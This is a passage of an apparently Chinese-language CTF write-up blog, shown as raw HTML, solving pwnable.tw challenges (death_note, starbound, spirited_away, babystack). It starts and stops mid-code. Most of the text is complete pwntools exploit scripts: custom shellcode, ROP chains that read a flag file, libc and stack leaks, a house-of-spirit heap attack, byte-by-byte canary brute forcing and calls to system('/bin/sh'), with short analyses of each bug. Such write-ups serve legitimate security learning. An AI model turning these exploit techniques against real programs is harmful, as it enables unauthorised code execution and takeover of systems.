class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10201</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./death_note&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, name</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Name :&#x27;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    pop ecx</span></span><br><span class="line"><span class="string">    dec ecx</span></span><br><span class="line"><span class="string">    dec ecx</span></span><br><span class="line"><span class="string">    xor [eax+0x2b], cl</span></span><br><span class="line"><span class="string">    xor [eax+0x2c], cl</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    inc eax</span></span><br><span class="line"><span class="string">    inc eax</span></span><br><span class="line"><span class="string">    inc eax</span></span><br><span class="line"><span class="string">    inc eax</span></span><br><span class="line"><span class="string">    inc eax</span></span><br><span class="line"><span class="string">    inc eax</span></span><br><span class="line"><span class="string">    inc eax</span></span><br><span class="line"><span class="string">    inc eax</span></span><br><span class="line"><span class="string">    inc eax</span></span><br><span class="line"><span class="string">    inc eax</span></span><br><span class="line"><span class="string">    inc eax</span></span><br><span class="line"><span class="string">    inc ecx</span></span><br><span class="line"><span class="string">    inc ecx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#修改free函数got表为堆块</span></span><br><span class="line">add(-<span class="number">19</span>, asm(shellcode)+<span class="string">b&#x27;\x33\x7e&#x27;</span>)</span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x0d-starbound"><a href="#0x0d-starbound" class="headerlink" title="0x0d. starbound"></a>0x0d. starbound</h2><p><code>checksec</code>看到开了NX和Fortity，那么格式化字符串不能用</p>
<p>然后来看程序，main函数通过数组索引来调用函数，但index并无检查，且函数表在bss段，因此基本可以任意函数调用（只要能知道那个函数的地址）</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">256</span>]; <span class="comment">// [esp+10h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">0x3C</span>u);</span><br><span class="line">    menu_0();</span><br><span class="line">    <span class="keyword">if</span> ( !readn(nptr, <span class="number">0x100</span>u) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    index = strtol(nptr, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !index )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))nop[index])();             <span class="comment">// 数组溢出</span></span><br><span class="line">  &#125;</span><br><span class="line">  do_bye();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再在程序里面找找，可以在<code>do_die</code>函数中发现一个格式化字符串漏洞</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">do_die</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1036</span>]; <span class="comment">// [esp+20h] [ebp-40Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __printf_chk(<span class="number">1</span>, a1);                          <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">&quot;Save your record? (y/n)&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( buf[<span class="number">0</span>] == <span class="number">121</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = __sprintf_chk(buf, <span class="number">1</span>, <span class="number">1024</span>, <span class="string">&quot;Map seed: %08X\nScore: %d\n&quot;</span>, me, score);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;buf[v1], byte_8057F98, dword_8057F84 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    do_send_record(buf, <span class="number">0x400</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  do_bye();</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是由于<code>Fortity</code>保护的存在，不能使用<code>%n</code>修改任意地址值</p>
<p>但是实际上我们只需要第一个漏洞就完全足够了，在bss段上储存着很多的全局变量，其中就有我们可以任意写的<code>name</code>，那么我们可以修改name为一个可用的gadget，然后再在栈中写入payload，就可以直接进行ROP利用了（相当于一个栈溢出</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int cmd_set_name()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  __printf_chk(1, &quot;Enter your name: &quot;);</span><br><span class="line">  result = readn(name_0, 0x64u);</span><br><span class="line">  *(_BYTE *)(result + 0x80580CF) = 0;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>本来的想法是<code>ret2libc</code>，但是远程的libc版本怎么也搜不出来，就只好用orw了</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;x86_64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10202</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./starbound&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./starbound&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ppp = <span class="number">0x080494da</span></span><br><span class="line">open_ = elf.plt[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在name中布置函数地址，用于数组溢出调用</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;7. Multiplayer\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;4. Toggle View&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Enter your name: &#x27;</span>)</span><br><span class="line">io.sendline(p32(<span class="number">0x804a6d9</span>)+<span class="string">b&#x27;/home/starbound/flag\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;4. Toggle View&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入payload</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;7. Multiplayer\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-33\n&#x27;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)+p32(open_)+p32(ppp)+p32(<span class="number">0x80580d4</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+ \</span><br><span class="line">                                       p32(read)+p32(ppp)+p32(<span class="number">3</span>)+p32(<span class="number">0x8058300</span>)+p32(<span class="number">0x50</span>)+ \</span><br><span class="line">                                       p32(puts_plt)+p32(<span class="number">0x8058300</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x0e-spirited-away"><a href="#0x0e-spirited-away" class="headerlink" title="0x0e. spirited_away"></a>0x0e. spirited_away</h2><p>只开启了NX保护，程序中看上去似乎没有什么明显漏洞，但是仔细观察可以发现<code>v1[56]</code>可以被溢出，当<code>sprintf(v1, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt);</code>中cnt的十进制形式为两位时会溢出\x00字节到<code>nbytes</code>变量。当cnt的十进制形式为三位时会溢出<code>nbytes</code>为n</p>
<p>因此只需要重复100次就可以产生使<code>name</code>和<code>comment</code>溢出，然后就是利用堆溢出进行<code>house of spirit</code></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10204</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./spirited_away&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">survey</span>(<span class="params">name, age, reason, comment</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please enter your name: &#x27;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please enter your age: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(age).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Why did you came to see this movie? &#x27;</span>)</span><br><span class="line">    io.send(reason)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please enter your comment: &#x27;</span>)</span><br><span class="line">    io.send(comment)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">survey_2</span>(<span class="params">age, reason</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please enter your age: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(age).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Why did you came to see this movie? &#x27;</span>)</span><br><span class="line">    io.send(reason)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    survey(<span class="string">b&#x27;A&#x27;</span>, <span class="number">1</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">5</span>, <span class="string">b&#x27;C&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;: &#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露栈中libc</span></span><br><span class="line">survey(<span class="string">b&#x27;A&#x27;</span>, <span class="number">1</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">5</span>, <span class="string">b&#x27;C&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Reason: BBBB&#x27;</span>)</span><br><span class="line">libcbase = (u32(io.recv(<span class="number">4</span>)) &amp; <span class="number">0xffffff00</span>)-<span class="number">0x1b0000</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">sys = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露栈地址</span></span><br><span class="line">survey(<span class="string">b&#x27;A&#x27;</span>, <span class="number">1</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x50</span>, <span class="string">b&#x27;C&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Reason: &#x27;</span>+<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x50</span>)</span><br><span class="line">stack = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&#x27;stack ===&gt; &#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">100</span>):</span><br><span class="line">    survey_2(<span class="number">1</span>, <span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;: &#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#house of spirit</span></span><br><span class="line">construct_chunk = p32(<span class="number">0</span>)+p32(<span class="number">0x41</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span> + p32(<span class="number">0</span>)+p32(<span class="number">0x41</span>)</span><br><span class="line">survey(<span class="string">b&#x27;A&#x27;</span>, <span class="number">1</span>, construct_chunk, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x54</span>+p32(stack-<span class="number">0x20</span>-<span class="number">0x48</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">survey(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x4c</span>+p32(sys)+p32(<span class="number">0</span>)+p32(bin_sh), <span class="number">1</span>, <span class="string">b&#x27;B&#x27;</span>, <span class="string">b&#x27;C&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x0f-babystack"><a href="#0x0f-babystack" class="headerlink" title="0x0f. babystack"></a>0x0f. babystack</h2><p>保护全开，程序只有三个选项，login，return，copy</p>
<ul>
<li><code>login</code>可以在比较随机数正确时，置bss段的<code>login_sign</code>为1，即可以使用后面两个功能</li>
<li><code>return</code>可以在比较随机数正确时绕过canary，否则直接进入<code>__stack_chk_fail</code>函数</li>
<li><code>copy</code>函数可以通过<code>strcpy</code>函数拷贝栈中变量到调用函数中，存在溢出漏洞</li>
</ul>
<p>仔细来看login函数可以发现它的比较位数和我们的输入位数是相等的，因此一位一位进行爆破，甚至可以爆破出栈中存在的其他变量</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_DEF</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">128</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your passowrd :&quot;</span>);</span><br><span class="line">  read_0(s, <span class="number">127LL</span>);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(s, a1, v1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Failed !&quot;</span>);</span><br><span class="line">  login = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Login Success !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么我们就可以先爆破出来随机数</p>
<p>因为copy函数使用时并没有清空缓冲区，并且copy函数和login函数的栈空间一致，因此在login函数中输入的字符串的后一部分会和copy输入的字符串拼接后来产生溢出</p>
<p>我们可以在栈中找到一个libc地址，然后strcpy可以将其拷贝到main中，继续爆破可以得到其值，然后需要分多次拷贝payload到栈中，因为strcpy存在0截断</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_64.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">buf</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your passowrd :&#x27;</span>)</span><br><span class="line">    io.send(buf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">copy</span>(<span class="params">buf</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Copy :&#x27;</span>)</span><br><span class="line">    io.send(buf)</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破得到canary</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_canary</span>():</span><br><span class="line">    canary = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    record = []</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">            login(canary+p8(i)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            temp = io.recv(<span class="number">6</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;Login&#x27;</span> <span class="keyword">in</span> temp:</span><br><span class="line">                canary += p8(i)</span><br><span class="line">                menu(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破libcbase</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libcbase</span>(<span class="params">canary</span>):</span><br><span class="line">    buf = canary+<span class="string">b&#x27;1\n&#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">6</span></span><br><span class="line">    libcvalue = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">           login(buf+libcvalue+p8(i)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">           temp = io.recv(<span class="number">6</span>)</span><br><span class="line">           <span class="keyword">if</span> <span class="string">b&#x27;Login&#x27;</span> <span class="keyword">in</span> temp:</span><br><span class="line">               libcvalue += p8(i)</span><br><span class="line">               menu(<span class="number">1</span>)</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> u64(libcvalue.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">canary = get_canary()</span><br><span class="line"></span><br><span class="line"><span class="comment">#strcpy时顺便复制libc某处值到buf</span></span><br><span class="line">login(<span class="string">b&#x27;\x00&#x27;</span>.ljust(<span class="number">0x40</span>, <span 